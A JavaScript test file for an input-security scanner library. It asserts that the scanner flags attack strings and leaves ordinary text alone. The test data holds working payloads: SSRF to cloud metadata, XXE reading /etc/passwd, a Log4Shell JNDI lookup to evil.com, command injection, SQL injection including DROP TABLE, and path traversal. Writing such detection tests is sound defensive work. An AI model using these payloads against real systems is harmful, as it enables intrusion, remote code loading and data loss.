'use strict';

const test = require('node:test');
const assert = require('node:assert');
const guard = require('../index');

const has = (input, type) => guard.scan(input).threats.some((t) => t.type === type);

test('nuevos ataques: detecta cada categoría', () => {
  const cases = [
    ['http://169.254.169.254/latest/meta-data', 'ssrf'],
    ['http://2130706433/admin', 'ssrf'],
    ['gopher://127.0.0.1:6379/_FLUSHALL', 'ssrf'],
    ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', 'xxe'],
    ['{"__proto__":{"admin":true}}', 'prototype-pollution'],
    ['a[constructor][prototype][x]=1', 'prototype-pollution'],
    ['${jndi:ldap://evil.com/a}', 'log4shell'],
    ['${${lower:j}ndi:${lower:l}dap://x/a}', 'log4shell'],
    ['//*[name()="x"]', 'xpath-injection'],
    ["{{ ''.__class__.__mro__ }}", 'template-injection'],
    ['x‮y', 'unicode-evasion'],
    ['1 AND extractvalue(1,concat(0x7e,version()))', 'sql-injection'],
    ['1 order by 5--', 'sql-injection'],
    ['cat${IFS}/etc/passwd', 'command-injection'],
    ['....//....//etc/passwd', 'path-traversal'],
    ['a\r\nBcc: victim@example.com', 'crlf-injection'],
    ['*)(uid=*))(|(uid=*', 'ldap-injection'],
    ['user[$ne]=x', 'nosql-injection']
  ];
  for (const [input, type] of cases) {
    assert.ok(has(input, type), `${type} no detectado en ${JSON.stringify(input)}`);
  }
});

test('evasión: payloads codificados se detectan y se marcan', () => {
  for (const payload of [
    "%27%20OR%201%3D1--",
    '%2527%2520OR%25201%253D1--',
    '1 UN/**/ION SEL/**/ECT a,b FROM t',
    'ＳＥＬＥＣＴ * ＦＲＯＭ users',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'
  ]) {
    assert.strictEqual(guard.scan(payload).safe, false, payload);
  }
  assert.ok(guard.scan('%27%20OR%201%3D1--').threats[0].evasion);
});

test('decode:false desactiva la normalización', () => {
  const raw = guard.createScanner({ decode: false });
  assert.strictEqual(raw.isSafe('1 UN/**/ION SEL/**/ECT a FROM t'), true);
});

test('texto normal no genera falsos positivos', () => {
  for (const ok of [
    "Hello, my name is O'Brien", 'I love rock & roll', 'Please confirm (soon)',
    'Price: 5 < 10 and 3 > 2', 'Meet at 5 or 6 in the evening', 'Order by Friday',
    'https://example.com/path?q=1', 'user@example.com', 'C# and .NET developer',
    '100% off today', 'The prototype was great', 'José Núñez', '東京都 渋谷区'
  ]) {
    assert.strictEqual(guard.isSafe(ok), true, ok);
  }
});

test('scanDeep revisa valores y claves anidadas', () => {
  const r = guard.scanDeep({ user: { name: 'ok', bio: "' OR 1=1 --" }, tags: ['a', '<script>x</script>'] });
  assert.strictEqual(r.safe, false);
  assert.deepStrictEqual(r.threats.map((t) => t.path).sort(), ['tags.1', 'user.bio']);
  const polluted = guard.scanDeep(JSON.parse('{"__proto__":{"x":1}}'));
  assert.ok(polluted.threats.some((t) => t.key && t.type === 'prototype-pollution'));
});

test('middleware bloquea con 400 y deja pasar lo seguro', () => {
  const mw = guard.middleware();
  let nexted = false;
  mw({ body: { name: 'Ana' }, query: {}, params: {} }, {}, () => { nexted = true; });
  assert.ok(nexted);

  let out;
  const res = { status(c) { out = { code: c }; return this; }, json(b) { out.body = b; } };
  mw({ body: { q: "'; DROP TABLE users;--" } }, res, () => assert.fail('no debe continuar'));
  assert.strictEqual(out.code, 400);
  assert.strictEqual(out.body.threats[0].path, 'body.q');
});
